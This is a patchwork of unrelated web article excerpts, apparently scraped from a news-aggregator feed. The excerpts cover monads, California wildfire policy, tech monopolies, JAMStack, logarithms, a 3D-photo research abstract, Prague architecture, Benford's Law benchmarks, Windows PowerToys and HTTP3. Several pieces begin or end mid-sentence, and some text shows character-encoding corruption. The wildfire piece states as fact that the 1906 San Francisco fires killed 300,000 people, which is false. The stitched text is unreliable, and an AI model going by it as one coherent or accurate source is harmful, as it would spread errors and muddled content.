href="https://www.youtube.com/watch?v=YR5WdGrpoug" target="_blank">better choice</a>. Nevertheless, if your language doesn’t have those abstractions, you can use monads to solve them. And of course, like any powerful abstraction, you can invent new monads to simplify your business logic.</p><hr><p>(1) I cheated a bit with <code>Chainer</code>, by avoiding the subtypes <code>Just</code> and <code>Nothing</code>. This makes it so you can’t express something like <code>Just(null)</code>. Still, it gets at the essence : ) </p><p>(2) Likewise, <code>Promise</code> isn’t quite a monad, because it mixes both <code>flatMap</code> and <code>map</code> with <code>then</code>. This makes it so you can’t have a <code>Promise&lt;Promise&lt;Res&gt;&gt;</code>. Again though, it gets at the essence</p><p><em>Thanks to Joe Averbukh, Mark Shlick, Daniel Woelfel, Irakli Safareli, Jacky Wang for reviewing drafts of this essay</em></p></span></p></div></div></div>]]>

<p>California's on fire. Again.</p>
<p>It doesn't have to be.</p>
<p>There's overwhelming, longstanding scientific consensus that California fires are due to a century-long aversion to controlled burns, and yet the state is vapor-locked when it comes to doing something with that knowledge.</p>
<p>Writing in Propublica, Elizabeth Weil sums up the entire situation in six words: "The state is in the hole."</p>
<p>California has a century of fire debt, compounded by climate change. It's gonna burn. How that happens is up to us.</p>
<p><a href="https://www.propublica.org/article/they-know-how-to-prevent-megafires-why-wont-anybody-listen">https://www.propublica.org/article/they-know-how-to-prevent-megafires-why-wont-anybody-listen</a></p>
<p>Controlled burns are politically impossible (for now), thanks to "culture, greed, liability laws and good intentions gone awry." Since 1905, California has "made war on nature," starting with the genocide of First Nations people who had tended the land with fire.</p>
<p>After the 1906 SF quake and the fires that killed 300,000, California adopted a fire policy more like "a field surgeon wielding a bone saw than a preventive medicine specialist with a tray full of vaccines."</p>
<p>Where there is war, there are profiteers, and the same military-industrial complex that has perfected Beltway Banditry has also turned fire into commerce, with Cal Fire budgets heading to $1B this year, much of showered on the likes of Lockheed Martin.</p>
<p>Perversely, most of this money is spent on "air shows" that dump fire-suppressant on forests that are overdue for burning, doing nothing but exacerbating the problem (not even saving inhabited areas).</p>
<p>And while prison laborers earn slave wages risking life and limb to fight fires, Cal Fire's salaried workforce average $148k/year and periodically, these firefighters have turned arsonist, starting fires.</p>
<p>The perps are usually characterized as deranged, but may simply be looking for overtime.</p>
<p>Contrast this money-making juggernaut with controlled burns. When megafires blaze, contractors don't have to get permits to drive into wooded areas, or fill in impact statements.</p>
<p>Controlled burns aren't emergencies and don't generate overtime pay, and megafires are never shut down because there's a lot of particulate that day such that a burn would push pollution over the Clean Air Act's PM2.5 threshold.</p>
<p>But controlled burns allow residents with breathing issues to leave town, they allow for mask stockpiling, they can be scheduled around major events or the school year. The pollution from controlled burns is "minuscule" when compared to wildfires.</p>
<p>But a burn boss who never sets a controlled burn faces no consequences, while the burn boss whose controlled burn goes awry can get into serious trouble.</p>
<p>Despite all this, there's still inaction. Gov Newsom's Memo of Understanding from earlier this month is toothless. The last Quadrennial Fire Review predicted that California would continue its course of inaction until a fire wiped out a city on the scale of San Diego.</p>
<p>California needs to burn a million acres to dig itself out of the hole of a century's worth of fire debt.</p>
<p>Some people are forming burn co-ops and creating burner certification programs, creating a volunteer corps of controlled burners.</p>
<p>"You won’t find any climate deniers on the fire line." -Tim Ingalsbee, founder, Firefighters United for Safety, Ethics, and Ecology</p>

<p>The copyright scholar James Boyle has a transformative way to think about political change. He tells a story about how the word "ecology" welded together a bunch of disparate issues into a movement.</p>
<p>Prior to "ecology," there were people who cared about owls, or air pollution, or acid rain, or whales, and while none of these people thought the others were misguided, they also didn't see them as being as part of the same cause.</p>
<p>Whales aren't anything like owls and acid rain isn't anything like ozone depletion. But the rise of the term "ecology," turned issues into a movement. Instead of being 1,000 causes, it was a single movement with 1,000 on-ramps.</p>
<p>Movements can strike at the root, look to the underlying  economic and philosophical problems that underpin all the different causes that brought the movement's adherents together. Movements get shit done.</p>
<p>Which brings me to monopolies. This week, Mark Zuckerberg, one of the world's most egregious, flagrant, wicked monopolists, made a bunch of public denunciations of Apple for…monopolistic conduct.</p>
<p>Or, at least, he tried to. Apple stopped him. Because they actually do have a monopoly (and a monoposony) (in legal-economic parlance, these terms don't refer to a single buyer or seller, they refer to a firm with "market power" – the power to dictate pricing).</p>
<p>Facebook is launching a ticket-sales app and the Ios version was rejected because it included a notice to users that included in their price was a 30% vig that Apple was creaming off of Facebook's take.</p>
<p><a href="https://www.theverge.com/2020/8/28/21405140/apple-rejects-facebook-update-30-percent-cut">https://www.theverge.com/2020/8/28/21405140/apple-rejects-facebook-update-30-percent-cut</a></p>
<p>Apple blocked the app because this was "irrelevant" information, and their Terms of Service bans "showing irrelevant" information.</p>
<p>This so enraged Zuck that he gave a companywide address – of the sort that routinely leaks – calling Apple a monopolist (they are), accused them of extracting monopoly rents (they do), and of blocking "innovation" and "competition" (also true).</p>
<p><a href="https://www.buzzfeednews.com/article/pranavdixit/zuckerberg-apple-monopoly">https://www.buzzfeednews.com/article/pranavdixit/zuckerberg-apple-monopoly</a></p>
<p>Now, there are a bunch of Apple customers who consider themselves members of an oppressed religious minority who'll probably stop here (perhaps after an angry reply), and that's OK. You do you. But I have more to say.</p>
<p>Apple is a monopolist, sure, but more importantly, they are monoposonists – these are firms with "excessive buying power," gatekeepers who control access to purchasers. Monoposony power is <em>much</em> easier to accumulate than monopoly power.</p>
<p>In the econ literature, we see how control over as little as 10% of the market can cement a firm's position, giving it pricing power over suppliers. Monopsony is the source of "chickenization," named for the practices of America's chicken-processing giants.</p>
<p>Chickenized poultry farmers have to buy all their chicks from Big Chicken; the packers tell them what to feed their birds, which vets to use, and spec out their chicken coops. They set the timing on the lights in the coops, and dictate feeding schedules.</p>
<p>The chickens can only be sold to the packer that does all this control-freaky specifying, and the farmer doesn't find out how much they'll get paid until the day they sell their birds.</p>
<p>Big Chicken has data on all the farmers they've entrapped and they tune the payments so that the farmers can just barely scratch out a living, teetering on the edge of bankruptcy and dependent on the packer for next year's debt payments.</p>
<p>Farmers who complain in public are cut off and blackballed – like the farmer who lost his contract and switched to maintaining chicken coops, until the packer he'd angered informed all their farmers that if they hired him, they would also get cancelled.</p>
<p>Monopsony chickenizes whose groups of workers, even whole industries. Amazon has chickenized publishers. Uber has chickenized drivers. Facebook and Google have chickenized advertisers. Apple has chickenized app creators.</p>
<p>Apple is a monopsony. So is Facebook.</p>
<p>Market concentration is like the Age of Colonization: at first, the Great Powers could steer clear of one another's claims. If your rival conquered a land you had your eye on, you could pillage the one next door.</p>
<p>Why squander your energies fighting each other when you could focus on extracting wealth from immiserated people no one else had yet ground underfoot?</p>
<p>But eventually, you run out of new lands to conquer, and your growth imperative turns into direct competition.</p>
<p>We called that "World War One." During WWI, there were plenty of people who rooted for their countries and cast the fighting as a just war of good vs evil. But there was also a sizable anti-war movement.</p>
<p>This movement saw the fight as a proxy war between aristocrats, feuding cousins who were so rich that they didn't fight over who got grandma's china hutch – they fought over who got China itself.</p>
<p>The elites who started the Great War had to walk a fine line. If they told their side that Kaiser Bill is only in the fight to enrich undeserving German aristos, they risked their audience making the leap to asking whether their aristos were any more deserving.</p>
<p>GAFAM had divided up cyberspace like the Pope dividing the New World: ads were Goog, social is FB, phones are Apple, enterprise is Msft, ecommerce belongs to Amazon. There was blurriness at the edges, but they mostly steered clear of one another's turf.</p>
<p>But once they'd chickenized all the suppliers and corralled all the customers, they started to challenge one another's territorial claims, and to demand that we all take a side, to fight for Google's right to challege FB's social dominance, or to side with FB over Apple.</p>
<p>And they run a risk when they ask us to take a side, the risk that we'll start to ask ourselves whether <em>any</em> of these (tax-dodging, DRM-locking, privacy invading, dictator-abetting, workforce abusing) companies deserve our loyalty.</p>
<p>And that risk is heightened because the energy to reject monopolies (and monoposonies) needn't start with tech – the contagion may incubate in an entirely different sector and make the leap to tech.</p>
<p>Like, maybe you're a wrestling fan, devastated to see your heroes begging on Gofundme to pay their medical bills and die with dignity in their 50s from their work injuries, now there's only one major league whose owner has chickenized his workers.</p>

August 29, 2020 | https://formcake.com/blog/what-is-jamstack | <a href="https://web.archive.org/web/*/https://formcake.com/blog/what-is-jamstack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>The term JAMStack is meant to define a technology stack that relies heavily on JavaScript, APIs, and Markup. It also is meant to mean a whole lot more than that. In this article, we will explore how this concept is being expressed on the web.</p>
<p>
<span>J</span>avaScript<br>
<span>A</span>PIs<br>
<span>M</span>arkup<br>
<span>Stack</span><br>
</p><p>You may be thinking to yourself, JavaScript, microservices exposed via APIs, and of course markup make up most websites these days. How is JAMStack not just describing the web in 2020? When you google "JAMStack" you may see an ad for a <a href="https://jamstack.io/">portable electric apm</a>, but you will also see a result for <a href="https://jamstack.org/">JAMStack.org</a>. JAMStack.org is a nice resource that the folks over at <a href="https://www.netlify.com/">Netlify</a> have created in order to help codify a set of standards around an emerging trend in how websites can be built. Let's begin with the first definition listed on JAMStack.org</p>
<p>
        <span>“</span>
        Fast and secure sites and apps delivered by pre-rendering files and serving them directly from a CDN, removing the requirement to manage or run web servers.
    </p>

<p>This statement does not do a great job of picking apart the JAM in JAMStack but does do a good job of leading with some value propositions, techniques, and specific technologies that are hallmarks of JAMStack. Let's pick this apart 2005 style with a tag cloud.</p>
<p><span>Fast</span>
    <span>CDN</span>
    <span>Secure</span>
    <span>Pre-rendering</span>
    <span>No servers</span>
    <span>Sites</span>
    <span>Apps</span>

<p>I have given what I believe to be the proper weight to each of these key words that help make up JAMStack, but before we dig into them, let's start from the beginning of sorts. Here is <a href="https://simple-jamstack.netlify.app/">an exmaple of a JAMStack site</a>.</p>


<p>This site simply takes the last 5 movie picks from the <a href="https://developer.nytimes.com/docs/movie-reviews-api/1/overview">NYTimes Movies API</a>, renders them and adds an ability to vote on which films seem interesting and uninteresting via the <a href="https://formcake.com/api">Formcake API</a>. You could build this project in any number of stacks, but what makes this a JAMStack site? You can follow along in more detail using the public <a href="https://github.com/Formcake/simple-jamstack">repo</a>. Below we will go into some of these key aspects around JAMStack in more detail.</p>
<h2 id="pre-rending">Pre-rending</h2>
<p>One of the most important and talked about aspects of JAMStack is that projects are depoyed as static builds. It is a bit of a debate within the community on whether something must be statically built and hosted to be JAMStack but most JAMStack specific tooling is built around the idea of static builds. For those who are unfamiliar with this term, a static build simply means that a site or app is entirely or partially generated as flat files for serving. Those flat files are then returned to the user upon request as opposed to a server rendering them. The project could also be decribed as "Pre-rendered" since some or all of the site has been build ahead of time. When a change occurs to the content of a JAMStack site, you must rebuild it and serve the new flat files. A slice of a review website's static file structure may look like the following.</p>
<table>
<thead>
<tr>
<th>Url</th>
<th>Static File</th>
</tr>
</thead>
<tbody><tr>
<td>/</td>
<td>index.html</td>
</tr>
<tr>
<td>/movies</td>
<td>/movies/index.html</td>
</tr>
<tr>
<td>/movies/reviews</td>
<td>/movies/reviews/index.html</td>
</tr>
<tr>
<td>/movies/reviews/tenet</td>
<td>/movies/reviews/tenet/index.html</td>
</tr>
</tbody></table>
<pre><code>
index.html
movies/
    index.html
    reviews/
        index.html
        tenet/
            index.html

</code></pre>

<p>The <a href="https://github.com/Formcake/simple-jamstack">sample movie interest project</a> utilizes pre-rendering with the help of <a href="https://www.11ty.dev/">Eleventy</a>. Eleventy is a fantastic way to get started with static sites because it is extremely flexible and can grow with your project.</p>
<h2 id="no-servers">No Servers</h2>
<p>Like the term serverless, this is a bit of a misnomer. Of course JAMStack sites are served by a server. The preferred server stack however is one that is specifically designed to only deliver static files like <a href="https://aws.amazon.com/s3/">AWS S3</a>. There are many benefits to be gained from taking this approach. One of those is stability. When you choose a system like S3 to host your website, you are making many concessions. You have no control over the operating system, the software installed on the server, or even the choice of http server technology. The benefit however is that none of those are of any concern when you are doing something as simple as serving a static file. All of those decisions and layers of complexity are manged and run at enourmous levels at scale by AWS. This makes it very unlikely that your site will go down because those layers of complexity can be highly optimized when used for one purpose. The sample project does not use a custom server because it is hosted on Netlify. Netlify is designed around hosting static files and therefore is highly optimized for this purpose.</p>
<h2 id="cdn">CDN</h2>
<p>The next layer of hosting for a JAMStack site is the use of a CDN. A CDN, or content delivery network, is a way of storing snapshots of the pages of your website and distributing those around the world. When a user requests a page your CDN will deliver a cache or vesion of that page instead of your main server. The main benefit of a CDN is that it is the <strong>fastest</strong> way to deliver content and the most <strong>secure</strong> way as well. CDN's can obscure your main server from the world and help protect it from malicious traffic or activity. The sample project utilizes a CDN because it is hosted on Netlify and <a href="https://www.netlify.com/products/edge/">Netlify uses a CDN</a> to deliver deployed content.</p>
<h2 id="apis">APIs</h2>
<p>You may think that most websites are run via APIs these days and so why point this out. For JAMStack the importance on APIs centers around the fact that by default a JAMStack project does not have a web server to ping for data since a static hosting server is the only implied server in the stack. Many sites and most apps however need a server of some kind to create interactivity and store / access data. In the JAMStack world, it is encouraged that you either find a service with an API that performs an aspect that a server would or create a microservice using lambdas to still be as "serverless" as possible. Hosting platforms like <a href="https://www.netlify.com/">Netlify</a> and <a href="https://vercel.com/">Vercel</a> both support server like features using lambda functions. In the example application, I kept it simple and used Formcake's API to handle all server side features.</p>
<p><img src="https://formcake.com/images/blog-posts/nytimes-form.png" alt="Creating your token in Formcake"></p>
<p>Formcake allows a form submission through an ajax request and so it was easy to utilize this functionality to allow users to vote on movie picks.</p>
<pre><code>
axios.post('https://api.formcake.com/api/form/4e656bac-5c16-4d5d-be65-eb2928be0179/submission', {
    vote, 
    movieTitle
});

</code></pre>

<p>I could have gone to the trouble of creating a lambda based micro service for the voting mechanic but for simple projects it is far easier to use something off the shelf. This is also part of the JAMStack ethos in a way. It's all about what is possible when you fully decouple the front and backend.</p>
<h2 id="sites-and-apps">Sites and Apps?</h2>
<p>JAMStack.org mentions that JAMStack can be used for both websites and web applications. I agree with this sentiment but I also think that JAMStack is not perfectly suited for many types of applications. If you were to signup for <a href="https://formcake.com/pricing">Formcake's free plan</a> you would notice that most pages load like a server side rendered application. If you go to your /forms page, you will instantly be greeted with your forms. The same is true for an individual form detail page and your account page. This is because we utilize <a href="https://nuxtjs.org/">server side rendering technology</a> in order to deliver our site. We feel this to be a requirement for a SaaS application in 2020 because we are beyond the days of having loading wheels for every component on a single page application. It is a bit of an argument in the JAMStack community on whether an SSR application is a JAMStack project. I don't necessarily care because we should all be choosing the best technology for our projects but I feel that it is worth pointing out. This distinction makes JAMStack better suited for static content or sites with light interactivity in my opinion.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I hope this explanation of JAMStack is helpful to those looking to explore it. It has never been easier to create a powerful website with the pricipals behind JAMStack thanks to hosting platforms like <a href="https://www.netlify.com/">Netlify</a> and tools like <a href="https://formcake.com/">Formcake</a>. As always, if you feel that your project could benefit from JAMStack but does not quite meet the requirements, simply take from JAMStack what improves the project and leave behind what detracts from it. This is how we built Formcake and we are very pleased with the results.</p>

In fact, even for those who managed to maneuver around&nbsp;it back in high school, logarithm still remains largely as an <em>evasive</em> concept. The <strong>“I-can-manipulate-expressions-without-understanding-anything” syndrome</strong>&nbsp;runs rampant when it comes to logarithm.</p><p>Indeed, here in North America, the&nbsp;grade school curriculum has the propensity of overemphasizing the&nbsp;<strong>mechanics</strong>&nbsp;at the expense of&nbsp;<strong>basic theory</strong>, leaving us with the <em>formidable</em> task of filling in the <em>logarithmic</em> knowledge gap, which includes — among others&nbsp;— the theory behind the <strong>properties of logarithm</strong>, and its intended <strong>computational use</strong> in handling&nbsp;numbers with an&nbsp;<strong>order of magnitude</strong> veering towards the extremes.</p><p>So with that in mind, if you think that the time might have finally come to tame this <em>monster</em> we call logarithm, then it would be our pleasure to congratulate your timing on this very honorable act. And if&nbsp;you are simply looking to&nbsp;explore further into the rabbit hole, that would be <em>doubly</em> appreciated as well, for regardless of your motivation, the <strong>taming</strong>/<strong>musing</strong> is on!&nbsp;&nbsp;🙂<span id="more-5976"></span></p><h2 id="review"><span id="Logarithm_%E2%80%94_A_Review"></span><a href="#toc">Logarithm — A Review</a><span></span></h2><h3 id="terms"><span id="Terminology"></span><a href="#toc">Terminology</a><span></span></h3><p>Given a <em>real number</em> $x$, one of the challenges in <strong>elementary algebra</strong> is to express $x$ as a <em>power</em> of another number $b$ (known as the <strong>base</strong>). More specifically, we are interested in finding a&nbsp;number $\Box$ such that:</p><p>\begin{equation*} x = b^\Box \end{equation*}</p><p>As it turns out, this problem — in the <em>crude</em> form that it currently is at least — needs to be patched up first&nbsp;before any meaningful discussion can take place. For example:</p><ul><li>If the base is <em>negative</em>, then its powers need not be necessarily&nbsp;<a href="https://mathvault.ca/math-glossary/#welldefined"><strong>well-defined</strong></a> (e.g., $\displaystyle (-e)^{\frac{1}{2}}$).</li><li>If the base is $\displaystyle 1$, then any power of it would be just $1$, in which case, it would be <em>impossible</em>&nbsp;for it to generate any&nbsp;number that’s not $1$. A&nbsp;similar remark applies to the case&nbsp;where&nbsp;the base is equal to $0$.</li></ul><p>For these reasons, in the context of <strong>power determination</strong>, it’s customary to require&nbsp;the&nbsp;base $b$ to be a <em>positive</em> number — that is not equal to $1$. While under this assumption, any power of $b$ would necessarily have to be <em>positive</em>, it would also transpire —under this setup — that <em>any</em>&nbsp;positive number can be expressed as a power of $b$ in a <em>unique</em> way. That is, as long as $x$ is <em>positive</em>, there will be a <em>unique</em> number $\Box$ (known as the&nbsp;<strong>exponent</strong>) such that:</p><p>\begin{equation*} x= b^{\Box} \end{equation*}</p><p>in which case, we will simply call $\Box$ the <strong>logarithm</strong> of $x$ (in base $b$). In other words, logarithm is basically what happens when we expressed a number as a <em>power</em>, and then take the <em>exponent</em> from that power —&nbsp;It gives&nbsp;us the <strong>magnitude</strong> of a number, with respect to the base in question.</p><p>For example, when we try to express the number $64$ as a power of $2$, we get that $64= 2^6$. This alone shows that $6$ is the logarithm of $64$ — &nbsp;with respect to the base $2$.</p><p>Notation-wise, the logarithm of $x$ in <strong>base</strong> $b$ is denoted by $\log_b x$, with $x$ also being called&nbsp;the <strong>argument</strong> of the logarithm. When considered as a function, $\log_b x$ is defined on all <em>positive</em> numbers — as long as&nbsp;the base $b$ is <strong>valid</strong> (i.e.,&nbsp;&nbsp;$\displaystyle b&gt;0, b \ne 1$) .</p><p>To begin,&nbsp;we first note that <em>regardless</em> of the value of the base $b$, we always have that:</p><ul><li>$\displaystyle \log_b 1 = 0$ (since $0$ is the number $b$ needs to be raised to yield $1$)</li><li>$\displaystyle \log_b b&nbsp;= 1$ (since $1$ is the number $b$ needs to be raised to yield $b$)</li><li>$\displaystyle \log_b \frac{1}{b} = -1$ (since $-1$ is the number $b$ needs to be raised to yield $\displaystyle \frac{1}{b}$)</li></ul><p>Because these results are almost immediate and sufficiently notable, we’ll simply&nbsp;refer to&nbsp;them as the&nbsp;<strong>trivial logarithmic identities</strong>.</p><p>In addition,&nbsp;since $\log_b x$ stands for the number which&nbsp;<em>exponentiates</em> to $x$, we also have that by definition:</p><p>\begin{align*}b^{\log_b x} &amp; = x \qquad (\text{for all }x&gt;0)\end{align*}</p><p>On the other hand,&nbsp;we also have that:</p><p>\begin{align*} \log_b (b^x) = x \qquad (\text{for all } x \in \mathbb{R}) \end{align*}</p><p>Since one can see by inspection that $x$ is precisely the number which exponentiates to $b^x$.</p><p>For&nbsp;example, since $\displaystyle \log_2 53$ is the number that $2$ needs to raise to yield $53$, we have that $\displaystyle 2^{\log_2 53} =53$. Similarly, since $\displaystyle 10^{-\pi}$ is a power of $10$ with the exponent $-\pi$, we can infer&nbsp;that $\displaystyle \log_{10} \left(10^{-\pi}\right) = -\pi$.</p><h3 id="10"><span id="Common_Logarithm_(Base_10)"></span><a href="#toc">Common Logarithm (Base 10)</a><span></span></h3><p>Being the inverse of the exponential function $\displaystyle 10^x$, the base-$10$ logarithmic function — also known as the&nbsp;<a href="https://en.wikipedia.org/wiki/Common_logarithm" target="_blank" rel="noopener noreferrer"><strong>common logarithm</strong></a> — is customarily denoted by $\log_{10} x$, $\log x$, or simply $\lg x$ for short. The common logarithm is of great interest to us, primarily&nbsp;due to the prevalence of the&nbsp;<strong>decimal number system</strong> in various cultures around the world.</p><div><p><strong>Caution</strong></p><p>Note that in older scientific texts and some textbooks in higher mathematics, $\log x$ can also refer to — and usually is — the <a href="#e">natural logarithm of base $e$</a>.</p></div><p>When the common logarithm of a number is calculated, the&nbsp;<em>decimal representation</em> of the logarithm is usually split into two parts: the integer component&nbsp;(a.k.a., <strong>characteristic</strong>) and the fractional component&nbsp;(a.k.a., <strong>mantissa</strong>). The characteristic in essence tells us &nbsp;the <strong>number of digits</strong> the original number has, and the mantissa hints at the extent to which this&nbsp;number is close to its next power of $10$. These are the facts that make common logarithm a&nbsp;particularly handy tool in determining the <strong>order of magnitude</strong> of an <em>exceptionally&nbsp;large</em> (or <em>small</em>) number.</p><p>For example, to figure out the magnitude of the number $50!$ (i.e., $50 \times \cdots \times 1$), we proceed to calculate its logarithm, yielding that: \[ \log (50!) \approx 64.483 \] which means that $50! \approx 10^{64.483} =$ $10^{64}10^{0.483} \approx$ $10^{64} \cdot 3.04$, suggesting that $50!$ is a $65$<em>-digit number</em> which starts with $3$ — the <strong>characteristic</strong> $64$ gives away the number of digits, and the <strong>mantissa</strong> $0.483$ reveals&nbsp;the rest about the number itself.</p><p>Take home message? There is no need to&nbsp;write out a number in full to figure out its <em>approximate size</em>!</p><h3 id="2"><span id="Binary_Logarithm_(Base_2)"></span><a href="#toc">Binary Logarithm (Base 2)</a><span></span></h3><p>Being the inverse of the exponential function $2^x$, the <a href="https://en.wikipedia.org/wiki/Binary_logarithm" target="_blank" rel="noopener noreferrer"><strong>binary logarithm</strong></a>&nbsp;function $\log_2 x$ is extensively used in the field of <strong>computer science</strong>, primarily due to the fact that computers store information in <strong>bits</strong> (i.e., digits which takes $0$ or $1$ as possible values).</p><p>Similar to the case in base $10$, binary logarithm can be used to figure out&nbsp;the number of digits&nbsp;of a positive integer&nbsp;in <a href="https://en.wikipedia.org/wiki/Binary_number#Counting_in_binary" target="_blank" rel="noopener noreferrer"><strong>binary representation</strong></a>.

            <h2>Abstract</h2>

            <p>
              3D photography is a new medium that allows viewers to more fully experience a captured moment.
              In this work, we refer to a <i>3D photo</i> as one that displays parallax induced by moving the viewpoint (as opposed to a stereo pair with a fixed viewpoint).
              3D photos are static in time, like traditional photos, but are displayed with interactive parallax on mobile or desktop screens, as well as on Virtual Reality devices, where viewing it <i>also</i> includes stereo.
              We present an end-to-end system for creating and viewing 3D photos, and the algorithmic and design choices therein.
              Our 3D photos are captured in a single shot and processed directly on a mobile device.
              The method starts by estimating depth from the 2D input image using a new monocular depth estimation network that is optimized for mobile devices.
              It performs competitively to the state-of-the-art, but has lower latency and peak memory consumption and uses an order of magnitude fewer parameters.
              The resulting depth is lifted to a layered depth image, and new geometry is synthesized in parallax regions.
              We synthesize color texture and structures in the parallax regions as well, using an inpainting network, also optimized for mobile devices, on the LDI directly.
              Finally, we convert the result into a mesh-based representation that can be efficiently transmitted and rendered even on low-end devices and over poor network connections.
              Altogether, the processing takes just a few seconds on a mobile device, and the result can be instantly viewed and shared.
              We perform extensive quantitative evaluation to validate our system and compare its new components against the current state-of-the-art.            </p>

    <p>Sunshine Plaza (Slunecni namesti) in Prague was revitalized extensively since 2000 from a formerly large panel system-building (LPS) residential area.
LPS, sometimes also called Plattenbau, is a housing constructed of prefabricated concrete slabs.
Prefabrication allowed for lower-cost public housing, but residents resented it for its poor aesthetics.</p>

<p>After the collapse, this monotone but technology-loving design common in Eastern Bloc was gradually submerged into freer modern architecture.
Inhabitants painted more upbeat colors on the dull facades lifting the gloom of the plain concrete.
Advertisement posts of a variety of local enterprises went up.</p>

<p>The dominating spirit of achieving more with less using technology so far stayed in this europolis.
You will see that for yourself during the tour around a magnetic resonance clinic south of the communal church center,
a palm tree living inside of tiny glass bio-dome,
telecommunication towers grabbing the rooftops like landed space ships,
sub-way tube skylining over a pond,
and a weird robotic art piece next to a automated wine bar.</p>

<p>Enjoy the journey documenting the current state of the synthesis of the stark with the liberated.</p>

<p>Hopefully, the current generation wonâ€™t allow the resource pie to stop growing by exploring, innovating, building, and enterprising.
And thus, the next gallery will be from a new colony on Mars or an Oâ€™Neill cylinder in space.</p>

        <h2 id="benfords-law">Benford’s Law<a href="#benfords-law" arialabel="Anchor">⌗</a> </h2>
<p>After watching a Netflix documentary about Benford’s Law, i got really interested in it because it can help detect fraud in e.g. balance sheets. So i searched my favorite programming languages and detected that there is no npm Package for checking Benford’s Law.</p>
<p>Sooo … Long story short: I created nearly identical libraries for doing a Benford’s Law check in JavaScript, Go and Crystal. My inspiration was from a Python library - so the algorithm of these libraries is nearly identical. There are some catches like i used many different math libraries for calculating chi-square and some of these libraries offer addition information, others not …</p>
<p>But i think this gives us a good example of a algorithm which is implemented in different programming languages and can be benchmarked. That’s what i wanna do in this post: Comparing the Benford’s Law check in different Languages.</p>

<p>I didn’t expected that big difference. Go is clearly the winner here and that with big distance to the other implementations. One reason why Python took so long may be that the used library shows additional information but i don’t think Python could compete with the other implementations if the library wouldn’t show more.</p>
<p>It is also noteworthy that Go is very very fast compiling. Crystal isn’t even in the area of the Go compile time.</p>

<p>Windows PowerToys is back, and it rocks!</p>



<p>Many of us have been reliving the “old days”, this week as Windows 95 turned 25.  I loved Windows 95 when it came out and even <a aria-label="tweeted (opens in a new tab)" href="https://twitter.com/deltadan/status/1297945993942634497" target="_blank" rel="noreferrer noopener">tweeted</a> this week how it changed my life.  Without Windows 95, I don’t think I would have spent my career working with computers.  </p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Might seem goofy, but the day I bought and installed <a href="https://twitter.com/hashtag/Windows95?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#Windows95</a> was one of the greatest days of my life. It started a passion for computing and has blessed me with an incredible life. <a href="https://twitter.com/hashtag/Thanks?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#Thanks</a> to everyone that changes the world with this product! <a href="https://t.co/Lv0q48ceEs" target="_blank">pic.twitter.com/Lv0q48ceEs</a></p>— Dan Patrick (@deltadan) <a href="https://twitter.com/deltadan/status/1297945993942634497?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">August 24, 2020</a></blockquote></div>
</div></figure>



<p>I also loved the Windows 95 PowerToys. This was a download that would allow you to tweak Windows 95 and it was a great add-on. Below you see the add on that allowed the user to open a command prompt to a specific folder from within the “new”, the “Explorer” file management application.</p>



<p>BTW: if you miss the old Windows File Manager you can once again feel like you are running Windows for Workgroups <a aria-label="here (opens in a new tab)" rel="noreferrer noopener" href="https://github.com/Microsoft/winfile" target="_blank">here</a>.</p>

<!-- Horizontal Top Article -->
<p>You haven’t quite figured out HTTP2 yet that you’re already starting to get pissed off by people talking about HTTP3. But there’s a reason for that: HTTP3 is fast. I bet you in five minutes you’ll agree with me. </p>



<h3>Once upon a time</h3>



<p>I can’t tell you about the future without telling you about the present. <strong>Do you know about HTTP ?</strong> Defined in 1991, it’s the protocol that manages the web. It means <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol" target="_blank" rel="noreferrer noopener">HyperText Transfer Protocol</a> and it allows you to fetch resources from a web page. </p>



<p>From a web server to your browser. It’s built on a lower level protocol –<strong>TCP: it’s going to be important-</strong> and it’s stateless. It means that each request is completely independent. Each GIF present on this page is a GIF proudly independent in its life on the internet. That’s good for him and his life as a GIF. But for us it’s a bit of a broken system.</p>



<p>Because the problem is that <strong>each request will only look for one file at a time</strong>. Each time an expensive TCP connection is created for the occasion. Imagine if you had 10,000 Internet tips on your page.</p>



<p> I know a lot of people absolutely loved my pattern making skills in the previous article. So, to explain the Internets to you properly, I’m doing it again.</p>



<div><figure><img src="https://i.imgur.com/iI0MrHF.jpg" data-src="https://i.imgur.com/iI0MrHF.jpg" alt="http"></figure></div>



<p>Despite the fact that a browser can make six different requests at the same time, HTTP is still slow and full of TCP connections. Plus, we developers, usualy don’t care about that. <strong>We like to put as much crap on our pages as possible. </strong>Big jQuery lib with 300 useless CSS stylesheets ending with a big transparent 8 mega PNG. </p>



<p>When Google saw all the crap we were doing everywhere <strong>they started talking about SPDY</strong> (it’s called speedy). The point? To speed up the Internets. </p>



<p>SPDY is a specification that proposes to use HTTP as is but with a change of rules. And by <strong>compressing headers, prioritizing requests and multiplexing</strong>, it will transform all TCP requests and connections into one! </p>



<p>Concretely, when your HTML is read, your browser looks at everything you’re going to ask in your page. Then, it’s getting everything all at once. <strong>This way you avoid doing it file by file.</strong> </p>



<p>The first draft of HTTP2 is SPDY based. Very quickly HTTP2 was adopted and life on the internet has become faster. <strong>Today <a href="https://w3techs.com/technologies/details/ce-http2" target="_blank" rel="noreferrer noopener">42.7% of the internet</a> use HTTP2.</strong></p>



<div><figure><img src="https://i.imgur.com/2jePyHC.jpg" data-src="https://i.imgur.com/2jePyHC.jpg" alt="http2"></figure></div>



<h3>Great, what about HTTP3?</h3>



<p>If I piss you off with HTTP and HTTP2 when you explicitly clicked to see sexy HTTP3, there’s a good reason. HTTP2 was created by taking HTTP as a base and changing the rules.<strong> It’s the same thing with HTTP3. </strong>So by understanding the present it’s easier for me to explain the future to you.</p>



<p>Googlers are geeks, they never stop. After SPDY became HTTP2, they thought that it was still not fast enough. So they started talking about QUIC (it’s called Quick). <strong>This will be the second experimental technology developed by Google to become an official upgrade of the HTTP protocol</strong>. But what’s so special about this protocol?</p>



<p>The main big evolution of HTTP3 is the change of transport layer. No more of the heavy TCP connections I’ve been telling you about since the beginning. <strong>Now, it’s all about UDP. </strong></p>



<p>By the way QUIC means “Quick UDP Internet Connections”. This change of protocol will speed up connection establishment and data transfer times enormously. Howerver, <strong>UDP is certainly faster and simpler, but it doesn’t have the reliability and error handling of TCP.</strong></p>



